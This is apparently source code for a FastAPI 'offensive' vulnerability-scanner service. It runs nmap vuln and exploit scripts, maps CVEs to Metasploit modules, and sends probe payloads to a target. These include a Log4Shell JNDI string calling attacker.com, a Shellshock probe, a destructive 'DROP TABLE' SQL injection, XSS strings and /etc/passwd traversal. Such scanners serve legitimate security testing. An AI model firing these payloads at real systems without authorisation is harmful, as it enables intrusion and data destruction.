#!/usr/bin/env python3

import os
import json
import subprocess
import asyncio
import httpx
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import tempfile
import xml.etree.ElementTree as ET

app = FastAPI(
    title="Vulnerability Scanner Service",
    description="Serviço de scanner de vulnerabilidades ofensivo - Projeto Vértice",
    version="1.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Models
class VulnScanRequest(BaseModel):
    target: str
    scan_type: str = "comprehensive"  # quick, comprehensive, stealth, aggressive
    ports: Optional[str] = None
    exclude_ports: Optional[str] = None
    timing: int = 4  # 0-5 (paranoid to insane)
    scripts: bool = True
    os_detection: bool = True
    version_detection: bool = True

class CVEExploitRequest(BaseModel):
    cve_id: str
    target: str
    target_port: int

class WebVulnRequest(BaseModel):
    target: str
    scan_type: str = "full"  # quick, full, sqli, xss, lfi

class ScanResult(BaseModel):
    scan_id: str
    target: str
    status: str
    vulnerabilities: List[Dict]
    high_risk_count: int
    medium_risk_count: int
    low_risk_count: int
    recommendations: List[str]

# Scan storage (in production, use database)
active_scans = {}
completed_scans = {}

# CVE Database simulation (in production, integrate with real CVE API)
COMMON_EXPLOITS = {
    "CVE-2017-0144": {
        "name": "EternalBlue SMB",
        "description": "Remote Code Execution via SMB",
        "severity": "critical",
        "ports": [445],
        "metasploit_module": "exploit/windows/smb/ms17_010_eternalblue"
    },
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "description": "Remote Code Execution via Log4j",
        "severity": "critical",
        "ports": [8080, 80, 443],
        "payload": "${jndi:ldap://attacker.com/exploit}"
    },
    "CVE-2014-6271": {
        "name": "Shellshock",
        "description": "Bash Remote Code Execution",
        "severity": "critical",
        "ports": [80, 443],
        "payload": "() { :; }; echo vulnerable"
    }
}

def generate_scan_id() -> str:
    """Generate unique scan ID"""
    return f"vscan_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{os.getpid()}"

async def run_nmap_scan(scan_request: VulnScanRequest, scan_id: str):
    """Execute Nmap vulnerability scan"""
    try:
        # Build nmap command
        cmd = ["nmap"]

        # Scan type configurations
        if scan_request.scan_type == "quick":
            cmd.extend(["-T4", "-F"])
        elif scan_request.scan_type == "stealth":
            cmd.extend(["-T2", "-sS", "-f"])
        elif scan_request.scan_type == "aggressive":
            cmd.extend(["-T5", "-A"])
        else:  # comprehensive
            cmd.extend(["-T4", "-p-"])

        # Additional options
        if scan_request.version_detection:
            cmd.append("-sV")
        if scan_request.os_detection:
            cmd.append("-O")
        if scan_request.scripts:
            cmd.extend(["--script", "vuln,exploit,malware"])

        # Ports
        if scan_request.ports:
            cmd.extend(["-p", scan_request.ports])
        if scan_request.exclude_ports:
            cmd.extend(["--exclude-ports", scan_request.exclude_ports])

        # Timing
        cmd.extend(["-T", str(scan_request.timing)])

        # Output format
        cmd.extend(["-oX", "-"])
        cmd.append(scan_request.target)

        # Update scan status
        active_scans[scan_id]["status"] = "scanning"
        active_scans[scan_id]["command"] = " ".join(cmd)

        # Run scan
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()

        if process.returncode != 0:
            active_scans[scan_id]["status"] = "failed"
            active_scans[scan_id]["error"] = stderr.decode()
            return

        # Parse XML results
        try:
            root = ET.fromstring(stdout.decode())
            vulnerabilities = parse_nmap_vulns(root)

            # Categorize vulnerabilities
            high_risk = [v for v in vulnerabilities if v["severity"] == "high" or v["severity"] == "critical"]
            medium_risk = [v for v in vulnerabilities if v["severity"] == "medium"]
            low_risk = [v for v in vulnerabilities if v["severity"] == "low"]

            result = {
                "scan_id": scan_id,
                "target": scan_request.target,
                "status": "completed",
                "vulnerabilities": vulnerabilities,
                "high_risk_count": len(high_risk),
                "medium_risk_count": len(medium_risk),
                "low_risk_count": len(low_risk),
                "recommendations": generate_recommendations(vulnerabilities),
                "scan_summary": {
                    "total_ports": len(root.findall(".//port")),
                    "open_ports": len(root.findall(".//port[state[@state='open']]")),
                    "services_detected": len(root.findall(".//service"))
                }
            }

            # Move to completed scans
            completed_scans[scan_id] = result
            del active_scans[scan_id]

        except Exception as e:
            active_scans[scan_id]["status"] = "failed"
            active_scans[scan_id]["error"] = f"Failed to parse results: {str(e)}"

    except Exception as e:
        active_scans[scan_id]["status"] = "failed"
        active_scans[scan_id]["error"] = str(e)

def parse_nmap_vulns(xml_root) -> List[Dict]:
    """Parse Nmap XML output for vulnerabilities"""
    vulnerabilities = []

    for host in xml_root.findall(".//host"):
        host_ip = host.find(".//address[@addrtype='ipv4']").get("addr")

        # Parse script results for vulnerabilities
        for script in host.findall(".//script"):
            script_id = script.get("id")
            script_output = script.get("output", "")

            if "vuln" in script_id or "cve" in script_id.lower():
                # Extract CVE information
                cve_matches = extract_cves(script_output)

                for cve in cve_matches:
                    vuln = {
                        "id": cve,
                        "host": host_ip,
                        "port": get_port_from_script(host, script),
                        "service": get_service_from_script(host, script),
                        "severity": determine_severity(cve, script_output),
                        "description": script_output[:200] + "..." if len(script_output) > 200 else script_output,
                        "script": script_id,
                        "exploit_available": cve in COMMON_EXPLOITS,
                        "metasploit_module": COMMON_EXPLOITS.get(cve, {}).get("metasploit_module")
                    }
                    vulnerabilities.append(vuln)

    return vulnerabilities

def extract_cves(text: str) -> List[str]:
    """Extract CVE identifiers from text"""
    import re
    cve_pattern = r'CVE-\d{4}-\d{4,7}'
    return re.findall(cve_pattern, text.upper())

def get_port_from_script(host, script) -> int:
    """Get port number associated with script"""
    # Find the port that this script was run against
    for port in host.findall(".//port"):
        port_scripts = port.findall(".//script")
        if script in port_scripts:
            return int(port.get("portid"))
    return 0

def get_service_from_script(host, script) -> str:
    """Get service name associated with script"""
    for port in host.findall(".//port"):
        port_scripts = port.findall(".//script")
        if script in port_scripts:
            service = port.find(".//service")
            return service.get("name") if service is not None else "unknown"
    return "unknown"

def determine_severity(cve: str, output: str) -> str:
    """Determine vulnerability severity"""
    if cve in COMMON_EXPLOITS:
        return COMMON_EXPLOITS[cve]["severity"]

    # Simple heuristics
    if any(word in output.lower() for word in ["rce", "remote code execution", "critical"]):
        return "critical"
    elif any(word in output.lower() for word in ["high", "privilege escalation"]):
        return "high"
    elif any(word in output.lower() for word in ["medium", "information disclosure"]):
        return "medium"
    else:
        return "low"

def generate_recommendations(vulnerabilities: List[Dict]) -> List[str]:
    """Generate security recommendations"""
    recommendations = []

    if vulnerabilities:
        recommendations.append("🔥 CRITICAL: Vulnerabilities detected - immediate action required")

        # Count by severity
        critical = len([v for v in vulnerabilities if v["severity"] == "critical"])
        high = len([v for v in vulnerabilities if v["severity"] == "high"])

        if critical > 0:
            recommendations.append(f"🚨 {critical} critical vulnerabilities require immediate patching")
        if high > 0:
            recommendations.append(f"⚠️ {high} high-severity vulnerabilities need attention")

        # Specific recommendations
        if any("smb" in v.get("service", "").lower() for v in vulnerabilities):
            recommendations.append("🛡️ Disable SMB if not required or apply latest patches")
        if any("ssh" in v.get("service", "").lower() for v in vulnerabilities):
            recommendations.append("🔐 Review SSH configuration and disable password authentication")
        if any("http" in v.get("service", "").lower() for v in vulnerabilities):
            recommendations.append("🌐 Web services detected - perform additional web application testing")

    else:
        recommendations.append("✅ No obvious vulnerabilities detected in this scan")
        recommendations.append("🔍 Consider deeper penetration testing for comprehensive assessment")

    return recommendations

# API Routes
@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "active_scans": len(active_scans),
        "completed_scans": len(completed_scans),
        "service": "vulnerability-scanner"
    }

@app.post("/scan/vulnerability")
async def start_vulnerability_scan(scan_request: VulnScanRequest, background_tasks: BackgroundTasks):
    """Start comprehensive vulnerability scan"""
    scan_id = generate_scan_id()

    # Initialize scan record
    active_scans[scan_id] = {
        "scan_id": scan_id,
        "target": scan_request.target,
        "scan_type": scan_request.scan_type,
        "status": "queued",
        "started_at": datetime.utcnow().isoformat(),
        "progress": 0
    }

    # Start background scan
    background_tasks.add_task(run_nmap_scan, scan_request, scan_id)

    return {
        "message": "Vulnerability scan started",
        "scan_id": scan_id,
        "target": scan_request.target,
        "estimated_time": get_estimated_time(scan_request.scan_type)
    }

@app.get("/scan/{scan_id}/status")
async def get_scan_status(scan_id: str):
    """Get scan status and progress"""
    if scan_id in active_scans:
        return active_scans[scan_id]
    elif scan_id in completed_scans:
        return completed_scans[scan_id]
    else:
        raise HTTPException(status_code=404, detail="Scan not found")

@app.get("/scan/{scan_id}/results")
async def get_scan_results(scan_id: str):
    """Get detailed scan results"""
    if scan_id not in completed_scans:
        raise HTTPException(status_code=404, detail="Scan not found or not completed")

    return completed_scans[scan_id]

@app.post("/exploit/cve")
async def exploit_cve(exploit_request: CVEExploitRequest):
    """Test CVE exploit against target"""
    if exploit_request.cve_id not in COMMON_EXPLOITS:
        raise HTTPException(status_code=404, detail="CVE not in exploit database")

    exploit_info = COMMON_EXPLOITS[exploit_request.cve_id]

    # Simulate exploit attempt (EDUCATIONAL PURPOSES ONLY)
    result = {
        "cve_id": exploit_request.cve_id,
        "target": exploit_request.target,
        "port": exploit_request.target_port,
        "exploit_name": exploit_info["name"],
        "status": "simulated",  # Always simulate for safety
        "message": "⚠️ SIMULATION MODE: Real exploit not executed for safety",
        "metasploit_command": f"use {exploit_info.get('metasploit_module', 'N/A')}",
        "payload": exploit_info.get("payload", "N/A")
    }

    return result

@app.post("/scan/web-vulnerabilities")
async def scan_web_vulnerabilities(web_request: WebVulnRequest, background_tasks: BackgroundTasks):
    """Scan for common web application vulnerabilities"""
    scan_id = generate_scan_id()

    # Web vulnerability tests
    web_vulns = await test_web_vulnerabilities(web_request.target, web_request.scan_type)

    result = {
        "scan_id": scan_id,
        "target": web_request.target,
        "status": "completed",
        "vulnerabilities": web_vulns,
        "total_tests": len(web_vulns),
        "high_risk": len([v for v in web_vulns if v["severity"] in ["high", "critical"]]),
        "recommendations": generate_web_recommendations(web_vulns)
    }

    completed_scans[scan_id] = result
    return result

async def test_web_vulnerabilities(target: str, scan_type: str) -> List[Dict]:
    """Test for common web vulnerabilities"""
    vulnerabilities = []

    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            base_url = target if target.startswith("http") else f"http://{target}"

            # SQL Injection tests
            if scan_type in ["full", "sqli"]:
                sqli_payloads = ["'", "' OR 1=1--", "'; DROP TABLE users;--"]
                for payload in sqli_payloads:
                    try:
                        response = await client.get(f"{base_url}?id={payload}")
                        if any(error in response.text.lower() for error in ["mysql", "sql syntax", "ora-", "postgresql"]):
                            vulnerabilities.append({
                                "type": "SQL Injection",
                                "severity": "high",
                                "description": f"Potential SQL injection via parameter with payload: {payload}",
                                "url": f"{base_url}?id={payload}",
                                "recommendation": "Use parameterized queries and input validation"
                            })
                            break
                    except:
                        continue

            # XSS tests
            if scan_type in ["full", "xss"]:
                xss_payloads = ["<script>alert('XSS')</script>", "javascript:alert('XSS')"]
                for payload in xss_payloads:
                    try:
                        response = await client.get(f"{base_url}?q={payload}")
                        if payload in response.text:
                            vulnerabilities.append({
                                "type": "Cross-Site Scripting (XSS)",
                                "severity": "medium",
                                "description": f"Reflected XSS vulnerability detected",
                                "url": f"{base_url}?q={payload}",
                                "recommendation": "Implement proper input sanitization and output encoding"
                            })
                            break
                    except:
                        continue

            # Directory traversal
            if scan_type in ["full", "lfi"]:
                lfi_payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"]
                for payload in lfi_payloads:
                    try:
                        response = await client.get(f"{base_url}?file={payload}")
                        if any(indicator in response.text.lower() for indicator in ["root:", "administrator", "localhost"]):
                            vulnerabilities.append({
                                "type": "Local File Inclusion",
                                "severity": "high",
                                "description": "Directory traversal vulnerability detected",
                                "url": f"{base_url}?file={payload}",
                                "recommendation": "Implement path validation and access controls"
                            })
                            break
                    except:
                        continue

            # Check security headers
            try:
                response = await client.get(base_url)
                missing_headers = []

                security_headers = [
                    "X-Frame-Options", "X-Content-Type-Options",
                    "X-XSS-Protection", "Strict-Transport-Security",
                    "Content-Security-Policy"
                ]

                for header in security_headers:
                    if header not in response.headers:
                        missing_headers.append(header)

                if missing_headers:
                    vulnerabilities.append({
                        "type": "Missing Security Headers",
                        "severity": "low",
                        "description": f"Missing security headers: {', '.join(missing_headers)}",
                        "url": base_url,
                        "recommendation": "Implement proper security headers"
                    })
            except:
                pass

    except Exception as e:
        vulnerabilities.append({
            "type": "Scan Error",
            "severity": "info",
            "description": f"Error during web vulnerability scan: {str(e)}",
            "url": target,
            "recommendation": "Verify target accessibility and try again"
        })

    return vulnerabilities

def generate_web_recommendations(vulnerabilities: List[Dict]) -> List[str]:
    """Generate web security recommendations"""
    if not vulnerabilities:
        return ["✅ No obvious web vulnerabilities detected"]

    recommendations = []
    vuln_types = set(v["type"] for v in vulnerabilities)

    if "SQL Injection" in vuln_types:
        recommendations.append("🔥 CRITICAL: Implement parameterized queries immediately")
    if "Cross-Site Scripting (XSS)" in vuln_types:
        recommendations.append("🛡️ Implement input validation and output encoding")
    if "Local File Inclusion" in vuln_types:
        recommendations.append("⚠️ Restrict file access and validate file paths")
    if "Missing Security Headers" in vuln_types:
        recommendations.append("📋 Add security headers to improve defense")

    recommendations.append("🔍 Perform comprehensive penetration testing")
    return recommendations

def get_estimated_time(scan_type: str) -> str:
    """Get estimated completion time"""
    times = {
        "quick": "2-5 minutes",
        "comprehensive": "15-30 minutes",
        "stealth": "30-60 minutes",
        "aggressive": "10-20 minutes"
    }
    return times.get(scan_type, "15-30 minutes")

@app.get("/exploits/database")
async def get_exploit_database():
    """Get available exploits database"""
    return {
        "total_exploits": len(COMMON_EXPLOITS),
        "exploits": COMMON_EXPLOITS,
        "categories": {
            "critical": len([e for e in COMMON_EXPLOITS.values() if e["severity"] == "critical"]),
            "high": len([e for e in COMMON_EXPLOITS.values() if e["severity"] == "high"]),
            "medium": len([e for e in COMMON_EXPLOITS.values() if e["severity"] == "medium"])
        }
    }

@app.get("/scans/active")
async def get_active_scans():
    """Get all active scans"""
    return list(active_scans.values())

@app.get("/scans/completed")
async def get_completed_scans():
    """Get all completed scans"""
    return list(completed_scans.values())

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=80)